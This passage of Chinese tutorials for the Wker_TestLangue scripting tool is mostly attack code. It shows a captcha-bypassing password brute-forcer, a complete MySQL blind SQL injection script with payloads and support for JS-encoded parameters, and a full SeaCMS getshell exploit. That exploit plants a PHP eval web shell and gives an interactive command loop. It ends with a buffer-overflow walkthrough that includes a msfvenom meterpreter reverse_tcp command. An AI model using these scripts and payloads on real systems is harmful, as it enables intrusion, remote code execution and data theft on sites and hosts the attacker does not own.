   首先我们知道账号是admin，然后我们读取本地的password.txt文件，通过\r\n进行分割，得到一个密码字典数组，然后通过遍历数组进行爆破，但是这里有一点需要注意的是，我们如果`JudgeSuccess`返回的是一个1的话呢我们是不让i自增的，因为我们还需要再跑一次这个密码，如果是2则下一个密码，如果是3则密码成功。

   最终我们将会得到下面的结果：

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332691.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

   可以看到我们最终爆破成功了，验证码识别的并不是完全准确，但是准确率还是可以的。
   当然之后我会添加上需要人工智能的支持库，方便大家调用，并且还会推出许多渗透测试的函数出来！
## V 1.25
1. 修复github的中文路径上传下载

## V 1.26
1. 修复对象引用问题
2. 增加支持的全方面显示
3. 增建新特性#include 引入script下面的指定文件

## 由浅入深编写SQL注入脚本

### SQL注入脚本的构思

在此先需要提前声明一下，做次文章只是为了扩大大家的学习兴趣。

1. 目标数据库：mysql数据库
2. 使用的注入方法：盲注
3. 目标的得到的数据：数据库列表

tips：mysql是比较典型的注入，盲注也比较合适对脚本编写的理解，只得到数据库列表是因为获取表，列以及数据其实都是一样的（如果你看懂这篇文章的话呢）

### 原理

首先我们要知道盲注的原理：通过注入我们的恶意语句来得到使得服务器将我们的恶意语句（存在判断数据是否正确）带入到查询中，然后通过返回的页面来判断是否是正确的判断逻辑。

通常的来说我们盲注数据库列表需要下面三个步骤：

1. 获取数据库的个数
2. 获取某个数据库的名称长度
3. 按长度将每个字符的值取出

通常使用的payload：

```mysql
 and (select count(SCHEMA_NAME) from information_schema.SCHEMATA) >
 and (SELECT char_length((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ” ＋ 到文本 (数据库编号 － 1) ＋ “,1))) >
 and (SELECT ascii(SUBSTRING((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ” ＋ 到文本 (数据库编号 － 1) ＋ “,1),” ＋ 到文本 (位数) ＋ “,1)))>
```

我没有添加最后的数字。

实际上在mysql中有一个information_schema库保存着整个数据库的信息，如果对payload有不理解请先去了解一下为什么这个可以得到数据。

### 编写思路

判断个数和长度其实无非就是递增最后的变量，然后得到最后返回错误页面的变量值，那么如何判断页面是否返回正确呢？其实可以通过返回页面的内容的长度进行判断，我们首先要获得正常页面的长度，然后与注入payload返回页面的长度进行比较就可以知道是否是正常的页面。

### 判断页面是否正确

首先给大家先看一下文件结构：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140331592.jpg#pic_center)

1. SQLAttack.wker 脚本中保存着基本的注入方法
2. MYSQLAttack.wker 脚本中保存着mysql注入的相关方法
3. MYSQL_Interject.wker 脚本中含有mysql注入的逻辑
4. encryption.wker 暂时先不解释 （主要是解决存在js加密的）
5. js.js 含有js加密方法

因为我们在后面会遇到传参过程中存在非明文的情况，所以我们需要先写一个js的加密方法（这个后面会详细讲解js加密之后的注入脚本）

好了，我们开始回到正题，首先我们需要先编写SQLAttack.wker的方法

判断页面是否正确：

```js
function JudgeRESEqule(url,length){
	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	if(GetStrLength(res[0]) == length){
		return 1;
	}else{
		return 0;
	}
}
```

很简单，就是通过请求url得到页面的内容，然后判断是否和正常的长度相同，相同返回1，不相同返回0.

### 获取数据库的个数

首先我们先编写一个通用的获取长度的方法：其实就是一个递增的过程，使用while循环，一直进行递增，知道我们的页面不正确的时候就返回。

```js
function TakeLength(url,sentence,length){
	i = 0;
	while(JudgeRESEqule(url.URLEncode(sentence.i),length) == 1){
		i = ToInt(i+2);
	}
	if(JudgeRESEqule(url.URLEncode(sentence.(i-1)),length) == 1){
		return ToInt(i);
	}else{
		return ToInt(i-1);
	}
}
```

我们使用while循环一直调用前面写好的`JudgeRESEqule`函数，直到页面不正确则返回！

1. 第一个参数是url不带参数值的
2. 第二个参数是注入的语句
3. 第三个参数是页面的正确长度

写出这个基础函数之后我们就需要编写获取数据库个数的方法了：

```js
function GetDataBaseNum(url,length,ArgDefalutText){
	return TakeLength(url,ArgDefalutText." and (select count(SCHEMA_NAME) from information_schema.SCHEMATA) >",length);
}
```

这个方法写在MYSQLAttack.wker这个文件里面，因为我们现在要针对mysql进行编写了。

1. 参数1：检测的url
2. 参数2：正常的页面长度
3. 参数3：没有注入时候正常的参数（id=96这里的96就是正常的参数）

由于我们在MYSQLAttack.wker中使用了SQLAttack.wker的方法，所以我们需要引入这个文件：

```c++
#include ATTACKUTILS/SQLAttack.wker
```

这个方法其实无非就是调用我们之前写好的`TakeLength`方法得到返回错误时候的值。

### 获取数据库名称的长度

这个方法也是写在MYSQLAttack.wker当中的：

```js
function GetDataBaseLength(url,length,DataBaseindex,ArgDefalutText){
	return TakeLength(url,ArgDefalutText." and (SELECT char_length((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1))) >",length);
}
```

相对于获取数据库的个数，我们这里多了一个DataBaseindex的参数，用来得到指定编号的数据库名称的长度，思路和获取数据库个数一样的，只不过payload不一样罢了。

### 获取页面的正常长度

通过访问正常页面得到原先的长度值：

```js
function GetRealLength(url){
	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	return GetStrLength(res[0]);
}
```

### 二分法判断某一位的值

正方法是写在SQLAttack.wker中的，因为是基础方法

二分法如果不清楚的话呢去百度一下很简单的，二分法的代码：

```js
function dichotomy(url,sentence,length){
	max = 128;
	min = 0;
	medium = 64;
	while((max-min) > 1){
		if(JudgeRESEqule(url.URLEncode(sentence.medium),length) == 1){
			min = medium;
		}else{
			max = medium;
		}
		medium = ToInt((max+min)/2);
	}
	if(JudgeRESEqule(url.URLEncode(sentence.ToInt(min)),length) == 1){
		return ToInt(max);
	}else{
		return ToInt(min);
	}
}
```

因为我们要从0-128中猜一个数字，所以我们就定义最大最小值为128和0。

然后我们还是通过`JudgeRESEqule`判断我们猜的值对不对。

参数和`TakeLength`一样

### 获取数据库某一位的值

```js
function GetDataBaseStr(url,length,DataBaseindex,StringIndex,ArgDefalutText){
	return AsciiToChar(dichotomy(url,ArgDefalutText." and (SELECT ascii(SUBSTRING((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1),".StringIndex.",1)))>",length));
}
```

这个方法是写在MYSQLAttack.wker中的，这里我们通过二分法得到ASCII的值之后，我们就是用`AsciiToChar`函数得到对应的值。

二分法最后猜出来的数值就是某个字符的ASCII码。

这个方法多了StringIndex参数，主要是用来定位猜解第几个字符。

### 主逻辑

```js
#include ATTACKUTILS/MYSQLAttack.wker
function main(args)
{
	print("请输入您要测试的URL(不要带参数的值):");
	url =input();
	print("请输入参数的默认值:");
	par = input();
	length = GetRealLength(url.par);
	DataBaseNum = GetDataBaseNum(url,length,par);
	i = 0;
	while(i<DataBaseNum){
		DataBaseLength =GetDataBaseLength(url,length,i,par);
		j = 0;
		DataBaseName= "";
		while(j <DataBaseLength){
			DataBaseName = DataBaseName.GetDataBaseStr(url,length,i,ToInt(j+1),par);
			j=ToInt(j+1);
		}
		i = ToInt(i+1);
		print(DataBaseName);
	}
}
```

首先我们先导入MYSQLAttack.wker。

然后让用户输入注入的URL以及默认参数值。

然后获取正常页面的长度，然后获取数据库的个数，进入while循环，遍历每一个数据库

先获取数据库名称的长度，然后遍历每一个字符的值，最终打印处数据库的名称。

我们来看一下最后的执行结果：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332819.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

可以看到我们最终跑出了所有的数据库名称。

### 存在js加密的注入

在我们传递payload的过程中经常能碰到存在参数加密的事情，首先我们要对参数加上payload进行加密，那么我们就要找出加密的方法：

找js加密不是我们这里要讲的，所以这里我就给大家找出了js的加密算法：

```js
function enc() {  
   
    // private property  
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";  
   
    // public method for encoding  
    this.encode = function (input) {  
        var output = "";  
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;  
        var i = 0;  
        input = _utf8_encode(input);  
        while (i < input.length) {  
            chr1 = input.charCodeAt(i++);  
            chr2 = input.charCodeAt(i++);  
            chr3 = input.charCodeAt(i++);  
            enc1 = chr1 >> 2;  
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);  
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);  
            enc4 = chr3 & 63;  
            if (isNaN(chr2)) {  
                enc3 = enc4 = 64;  
            } else if (isNaN(chr3)) {  
                enc4 = 64;  
            }  
            output = output +  
            _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +  
            _keyStr.charAt(enc3) + _keyStr.charAt(enc4);  
        }  
        return output;  
    }  
   
    // public method for decoding  
    this.decode = function (input) {  
        var output = "";  
        var chr1, chr2, chr3;  
        var enc1, enc2, enc3, enc4;  
        var i = 0;  
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");  
        while (i < input.length) {  
            enc1 = _keyStr.indexOf(input.charAt(i++));  
            enc2 = _keyStr.indexOf(input.charAt(i++));  
            enc3 = _keyStr.indexOf(input.charAt(i++));  
            enc4 = _keyStr.indexOf(input.charAt(i++));  
            chr1 = (enc1 << 2) | (enc2 >> 4);  
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);  
            chr3 = ((enc3 & 3) << 6) | enc4;  
            output = output + String.fromCharCode(chr1);  
            if (enc3 != 64) {  
                output = output + String.fromCharCode(chr2);  
            }  
            if (enc4 != 64) {  
                output = output + String.fromCharCode(chr3);  
            }  
        }  
        output = _utf8_decode(output);  
        return output;  
    }  
   
    // private method for UTF-8 encoding  
    _utf8_encode = function (string) {  
        string = string.replace(/\r\n/g,"\n");  
        var utftext = "";  
        for (var n = 0; n < string.length; n++) {  
            var c = string.charCodeAt(n);  
            if (c < 128) {  
                utftext += String.fromCharCode(c);  
            } else if((c > 127) && (c < 2048)) {  
                utftext += String.fromCharCode((c >> 6) | 192);  
                utftext += String.fromCharCode((c & 63) | 128);  
            } else {  
                utftext += String.fromCharCode((c >> 12) | 224);  
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);  
                utftext += String.fromCharCode((c & 63) | 128);  
            }  
   
        }  
        return utftext;  
    }  
   
    // private method for UTF-8 decoding  
    _utf8_decode = function (utftext) {  
        var string = "";  
        var i = 0;  
        var c = c1 = c2 = 0;  
        while ( i < utftext.length ) {  
            c = utftext.charCodeAt(i);  
            if (c < 128) {  
                string += String.fromCharCode(c);  
                i++;  
            } else if((c > 191) && (c < 224)) {  
                c2 = utftext.charCodeAt(i+1);  
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));  
                i += 2;  
            } else {  
                c2 = utftext.charCodeAt(i+1);  
                c3 = utftext.charCodeAt(i+2);  
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));  
                i += 3;  
            }  
        }  
        return string;  
    }  
}
```

我们发现他发送请求的url是：http://127.0.0.1:8080/encGet.php?n=OTY%3D

然后通过分析n参数实际上是调用了上面js的enc中的encode方法，所以我们在注入的过程中我们也需要将我们的payload连通参数一起进行加密。

Wker_TestLangue中自带了js加密的方法：

```js
function Enc(str)
{
	return RunJS(ReadFile("js.js"),"e",str);
}

```

1. 参数1:js代码
2. 参数2:调用的函数名称
3. 参数3:js函数列表

我们的js文件：

```js
function enc() {  
   
    // private property  
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";  
   
    // public method for encoding  
    this.encode = function (input) {  
        var output = "";  
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;  
        var i = 0;  
        input = _utf8_encode(input);  
        while (i < input.length) {  
            chr1 = input.charCodeAt(i++);  
            chr2 = input.charCodeAt(i++);  
            chr3 = input.charCodeAt(i++);  
            enc1 = chr1 >> 2;  
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);  
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);  
            enc4 = chr3 & 63;  
            if (isNaN(chr2)) {  
                enc3 = enc4 = 64;  
            } else if (isNaN(chr3)) {  
                enc4 = 64;  
            }  
            output = output +  
            _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +  
            _keyStr.charAt(enc3) + _keyStr.charAt(enc4);  
        }  
        return output;  
    }  
   
    // public method for decoding  
    this.decode = function (input) {  
        var output = "";  
        var chr1, chr2, chr3;  
        var enc1, enc2, enc3, enc4;  
        var i = 0;  
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");  
        while (i < input.length) {  
            enc1 = _keyStr.indexOf(input.charAt(i++));  
            enc2 = _keyStr.indexOf(input.charAt(i++));  
            enc3 = _keyStr.indexOf(input.charAt(i++));  
            enc4 = _keyStr.indexOf(input.charAt(i++));  
            chr1 = (enc1 << 2) | (enc2 >> 4);  
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);  
            chr3 = ((enc3 & 3) << 6) | enc4;  
            output = output + String.fromCharCode(chr1);  
            if (enc3 != 64) {  
                output = output + String.fromCharCode(chr2);  
            }  
            if (enc4 != 64) {  
                output = output + String.fromCharCode(chr3);  
            }  
        }  
        output = _utf8_decode(output);  
        return output;  
    }  
   
    // private method for UTF-8 encoding  
    _utf8_encode = function (string) {  
        string = string.replace(/\r\n/g,"\n");  
        var utftext = "";  
        for (var n = 0; n < string.length; n++) {  
            var c = string.charCodeAt(n);  
            if (c < 128) {  
                utftext += String.fromCharCode(c);  
            } else if((c > 127) && (c < 2048)) {  
                utftext += String.fromCharCode((c >> 6) | 192);  
                utftext += String.fromCharCode((c & 63) | 128);  
            } else {  
                utftext += String.fromCharCode((c >> 12) | 224);  
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);  
                utftext += String.fromCharCode((c & 63) | 128);  
            }  
   
        }  
        return utftext;  
    }  
   
    // private method for UTF-8 decoding  
    _utf8_decode = function (utftext) {  
        var string = "";  
        var i = 0;  
        var c = c1 = c2 = 0;  
        while ( i < utftext.length ) {  
            c = utftext.charCodeAt(i);  
            if (c < 128) {  
                string += String.fromCharCode(c);  
                i++;  
            } else if((c > 191) && (c < 224)) {  
                c2 = utftext.charCodeAt(i+1);  
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));  
                i += 2;  
            } else {  
                c2 = utftext.charCodeAt(i+1);  
                c3 = utftext.charCodeAt(i+2);  
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));  
                i += 3;  
            }  
        }  
        return string;  
    }  
}
function e(str)
{
	var base = new enc();
	return base.encode(str);
}
```

其实只是在上面的代码中增加了对js加密的调用也就是e函数。

因为含有了js加密，所以我们之前写好的代码需要稍作调整：

```js
#include ATTACKUTILS/encryption.wker
function GetRealLength(url){
	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	return GetStrLength(res[0]);
}
function JudgeRESEqule(url,length){
	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	if(GetStrLength(res[0]) == length){
		return 1;
	}else{
		return 0;
	}
}
function dichotomy(url,sentence,length){
	max = 128;
	min = 0;
	medium = 64;
	while((max-min) > 1){
		if(JudgeRESEqule(url.URLEncode(Enc(sentence.medium)),length) == 1){
			min = medium;
		}else{
			max = medium;
		}
		medium = ToInt((max+min)/2);
	}
	if(JudgeRESEqule(url.URLEncode(Enc(sentence.ToInt(min))),length) == 1){
		return ToInt(max);
	}else{
		return ToInt(min);
	}
}
function TakeLength(url,sentence,length){
	i = 0;
	while(JudgeRESEqule(url.URLEncode(Enc(sentence.i)),length) == 1){
		i = ToInt(i+2);
	}
	if(JudgeRESEqule(url.URLEncode(Enc(sentence.(i-1))),length) == 1){
		return ToInt(i);
	}else{
		return ToInt(i-1);
	}
}
```

可以看到，我只是在进行payload拼接的时候将payload和参数进行了js的加密。

这样子我们只需要修改js.js文件中的e函数就可以实现js加密的注入了。

让给我们看下最后的结果：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332821.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

可以看到我们即使存在js也是可以注入成功的，这样增加了程序的灵活性

### 存在验证码

存在验证码的话呢请看之前的文章，如何实现存在验证码的暴力破解

### 完整代码

其实我这里编写的只是一个框架，如果js加密比较复杂那么还是需要进行许多其他的获取，这里只是最简单的操作

最终附带所有代码：

MYSQL_Interject.wker

```js
#include ATTACKUTILS/MYSQLAttack.wker
function main(args)
{
	print("请输入您要测试的URL(不要带参数的值):");
	url =input();
	print("请输入参数的默认值:");
	par = input();
	length = GetRealLength(url.Enc(par));
	DataBaseNum = GetDataBaseNum(url,length,par);
	i = 0;
	while(i<DataBaseNum){
		DataBaseLength =GetDataBaseLength(url,length,i,par);
		j = 0;
		DataBaseName= "";
		while(j <DataBaseLength){
			DataBaseName = DataBaseName.GetDataBaseStr(url,length,i,ToInt(j+1),par);
			j=ToInt(j+1);
		}
		i = ToInt(i+1);
		print(DataBaseName);
	}
}
```

MYSQLAttack.wker

```js
#include ATTACKUTILS/SQLAttack.wker

function GetDataBaseNum(url,length,ArgDefalutText){
	return TakeLength(url,ArgDefalutText." and (select count(SCHEMA_NAME) from information_schema.SCHEMATA) >",length);
}
function GetDataBaseLength(url,length,DataBaseindex,ArgDefalutText){
	return TakeLength(url,ArgDefalutText." and (SELECT char_length((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1))) >",length);
}
function GetDataBaseStr(url,length,DataBaseindex,StringIndex,ArgDefalutText){
	return AsciiToChar(dichotomy(url,ArgDefalutText." and (SELECT ascii(SUBSTRING((SELECT SCHEMA_NAME from information_schema.SCHEMATA limit ".DataBaseindex.",1),".StringIndex.",1)))>",length));
}
```

SQLAttack.wker

```js
#include ATTACKUTILS/encryption.wker
function GetRealLength(url){
	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	return GetStrLength(res[0]);
}
function JudgeRESEqule(url,length){
	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	if(GetStrLength(res[0]) == length){
		return 1;
	}else{
		return 0;
	}
}
function dichotomy(url,sentence,length){
	max = 128;
	min = 0;
	medium = 64;
	while((max-min) > 1){
		if(JudgeRESEqule(url.URLEncode(Enc(sentence.medium)),length) == 1){
			min = medium;
		}else{
			max = medium;
		}
		medium = ToInt((max+min)/2);
	}
	if(JudgeRESEqule(url.URLEncode(Enc(sentence.ToInt(min))),length) == 1){
		return ToInt(max);
	}else{
		return ToInt(min);
	}
}
function TakeLength(url,sentence,length){
	i = 0;
	while(JudgeRESEqule(url.URLEncode(Enc(sentence.i)),length) == 1){
		i = ToInt(i+2);
	}
	if(JudgeRESEqule(url.URLEncode(Enc(sentence.(i-1))),length) == 1){
		return ToInt(i);
	}else{
		return ToInt(i-1);
	}
}
```

encryption.wker

```js
function Enc(str)
{
	//return str;
	return RunJS(ReadFile("script\ATTACKUTILS\js.js"),"e",str);
}
```

js代码就不带了。

### 漏洞分析

拿个seacms的getshell吧，网上虽然有payload，但是貌似都是到phpinfo就停止了的。

所以我就下载下来自己去复现。

```
http://www.seacms1.com/search.php

POST:searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}
```

phpinfo那个地方修改成自己的函数，理论上来说这样就可以了，我们就可以改成自己的马了，但是不巧的是order参数多了一个`addslashes`函数，所以会稍微麻烦一些。

主要的思路是使用断言，然后传递个没有过滤的参数进去就可以了，所以可以构造下面的payload：

```
searchtype=5&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("shell.php","w"),'<?php @eval($_POST['test']); ?>')
```

但是改成一句话的时候又出现了问题，不知道是他做了啥过滤还是啥（没仔细去看），反正cmd参数里面有个$（$_POST['test']）这个就是不行，很麻烦，所以最后不得不间接执行一下了，所以我给出一个最终的payload：

1. 首先先写入payload：

   1. ```
      searchtype=5&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen("shell.php","w"),'<?php @eval(fread(fopen("shell.txt","r"),filesize("shell.txt"))); ?>')
      ```

   2. 这个是可以上传上去的，原理是我们不要$，而是执行的代码放在shell.txt里面

2. 写入shell.txt我们想要执行的php语句

3. 最后访问shell.php

这样子做就是动作有点大，但是勉勉强强满足了getshell的要求

### exp的编写

#### 上传shell

首先是先上传我们的shell.php：

```js
#define getshellpayload = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.php%22%2C%22w%22%29%2C%27%3C%3Fphp%20%40eval%28fread%28fopen%28%22shell.txt%22%2C%22r%22%29%2Cfilesize%28%22shell.txt%22%29%29%29%3B%20%3F%3E%27%29

function GetShell(url){
	return HttpPost(url."/search.php",getshellpayload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
}
```

这个就是简单的post请求，将结果数组返回回去，目的是为了判断是否写入了shell.php。

#### 上传shell.txt

```js
#define injectionTxtpayloadqian = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.txt%22%2C%22w%22%29%2C%27system%28%22
#define injectionTxtpayloadhou = %22%29%3B%27%29
function injectionTxt(url,cmd){
	return HttpPost(url."/search.php",injectionTxtpayloadqian.URLEncode(cmd).injectionTxtpayloadhou,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
}
```

这个也是同理，post请求，将我们想要之后的cmd拼接进去，然后得到shell.txt

#### 查看结果

```js
function GetRes(url){
	res = HttpGet(url."/shell.php","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	return res[0];
}
```

请求shell.php，将得到的页面结果返回回去。

#### 执行逻辑

```js
function main(args)
{
	print("请输入要测试的URL:");
	webUrl = input();
	res = GetShell(webUrl);
	if(StrFindStr(res[1],"200 OK",0) == "-1"){
		print("getshell失败");
		return "";
	}
	while(1 == 1){
		print("请输入要执行的命令(输入exit退出)");
		cmd = input();
		if(cmd == "exit"){
			break;
		}
		injectionTxt(webUrl,cmd);
		print(GetRes(webUrl));
	}
	
}
```

先得到shell，如果没得到的话呢就直接返回，如果得到的话呢就输入执行的命令，然后注入到shell.txt里面，最终得到结果。

#### 完整代码

```js
#define getshellpayload = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.php%22%2C%22w%22%29%2C%27%3C%3Fphp%20%40eval%28fread%28fopen%28%22shell.txt%22%2C%22r%22%29%2Cfilesize%28%22shell.txt%22%29%29%29%3B%20%3F%3E%27%29
#define injectionTxtpayloadqian = searchtype=5&order=%7D%7Bend%20if%7D%7Bif%3A1%29print%5Fr%28%24%5FPOST%5Bfunc%5D%28%24%5FPOST%5Bcmd%5D%29%29%3B%2F%2F%7D%7Bend%20if%7D&func=assert&cmd=fwrite%28fopen%28%22shell.txt%22%2C%22w%22%29%2C%27system%28%22
#define injectionTxtpayloadhou = %22%29%3B%27%29
function injectionTxt(url,cmd){
	return HttpPost(url."/search.php",injectionTxtpayloadqian.URLEncode(cmd).injectionTxtpayloadhou,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
}
function GetShell(url){
	return HttpPost(url."/search.php",getshellpayload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
}
function GetRes(url){
	res = HttpGet(url."/shell.php","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
	return res[0];
}
function main(args)
{
	print("请输入要测试的URL:");
	webUrl = input();
	res = GetShell(webUrl);
	if(StrFindStr(res[1],"200 OK",0) == "-1"){
		print("getshell失败");
		return "";
	}
	while(1 == 1){
		print("请输入要执行的命令(输入exit退出)");
		cmd = input();
		if(cmd == "exit"){
			break;
		}
		injectionTxt(webUrl,cmd);
		print(GetRes(webUrl));
	}
	
}
```

看一下最终的执行结果：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210308140332854.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE4MzkwNTYx,size_16,color_FFFFFF,t_70#pic_center)

## 缓冲区溢出
首先我们先要系统是XP没有开启DEP（开启的话呢需要rop绕过会有些麻烦，这里不详细将如何绕过）
如何检测你的虚拟机开没开DEP，首先我们打开我的电脑->属性：
![](data/attachment/album/202103/06/010612rdc8ciyy3abc0pzt.jpg)
如果那个noexecute=AlwaysOff的话呢说明这个DEP没有开启，系统是不会检测边界问题的，其实说白了就和我们当时玩XP内核用调试模式打开XP时候配置的boot.ini修改的位置一样，只不过我们这个时候是要更改noexecute这个属性。
然后重启一下，我们还是运行我们调试的程序。
这个时候我们要来做模糊测试了，首先我们的思路是这样子的，他既然没有检测我们的输入是否存在边界，那么我们就可以考虑，我们输入的内容会不会溢出到EIP这个寄存器呢？没错，这个就是我们想到的，那么我们如何检测呢？我们首先先用DBG附加我们的程序。
这里我们不能用OD，因为OD会捕获这个EIP位置的异常，我们需要设置，但是我怕我这里说了，会有点偏离文章主题，所以我们用一个`Immunity Debugger`，这个会把这个异常反馈给我们，我们用这个调试器附加进程，这个方便之处他可以查看进程开发的端口，容易选择，选择开放8888这个端口的进程。
我们先发送50个a给这个程序，看看这个程序会不会溢出。
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010615z9a0zj9sbfbnjoq3.jpg)
发过去之后，我们立马过去看调试：
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010619m60edh9kddrk5v6f.jpg)
这个时候程序pause了，可以看到EIP变成了4个61！那么为什么会变成61呢？想了一下，我们输入了a，它对应的十六进制的ASCII正好就是61！所以我们可以基本确定的是，我们输入的内容中的一部分被溢出到了EIP这个寄存器。
那么我们下一步就是要来确定到底是哪个位置溢出的字符变成了EIP的值，所以我们这个时候就要来找，这个时候我们有两种思路：

1. 使用二分法

2. 使用特征字符
    第一种就是比较基本的寻找，第二种就是输入50个不同的字符，然后看看是哪个位置的值覆盖了EIP。
    第二种kali之前是带了可以生成的工具，但是我的kali不知道什么原因出错了，可能是Ruby的版本不同吧。
    我就用二分法，也不是很难，就是在50个位置里面找一个位置，找个几次也就找出来了，这里的话呢我们最好用一个小脚本：

  ```js
  function main(args)
  {
          s = CreateTCPSocket("192.168.209.130",8888);
          wb = TCPSocketRecv(s);
          print(wb);
          b = AddBytes(GetSomeBytes("144",16),GetSomeBytes("97",4));
          TCPSocketSend(s,bw);
          wb = TCPSocketRecv(s);
          print(wb);
          CloseTCPSocket(s);
  }
  ```

  

详细的函数说明请看函数介绍，很简单就是通过更改"B"字符乘的个数，来确定到底是第几个位置出现了，也就是到底是乘几才会让EIP变成4个“O”。
最终发现16个B之后的连续四个字节会覆盖EIP。
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010621ny1z4g86oqcarjq1.jpg)
到此为止我们就已经完成了一半，我们现在可以控制程序的EIP，那么问题来了，虽然我们可以控制程序的EIP，那么如何让他执行我们想要执行的代码呢？这是一个问题。
这个时候我们多次尝试的过程中发现一个问题，当我们字符输入很多的时候，我们在四个“O”之后的内容会出现在栈中！这个意思就是说我们可以控制栈的内容：
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010624hkq8o9d16l5vj5vd.jpg)

所以说溢出的结构是：

——————————
原始位置
——————————
EIP
——————————
栈
——————————

这个时候就可以想到，如果我们在栈中放入我们的恶意代码，然后让EIP的值等于ESP，那么就会在目标系统执行我们的木马。
好了那么我们现在需要一段恶意代码，也就是能够在目标系统留一个后门程序的，那么我们如何得到呢？其实kali提供给我们了一个程序可以生成这么一段汇编代码，使用msfvenom这个程序进行生成。
具体命令：`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows`
![](https://bbs.ichunqiu.com/data/attachment/album/202103/06/010627uw8n8u923bk35668.jpg)
可以看到生成了一个Python格式的字节但是我们注意，可以看到我们这里面存在一个00，这个显然不是我们要的，因为00是字符串的结束啊，所以我们不能有00这个字节，那么我们就需要告诉他我们排除00这个badchar。
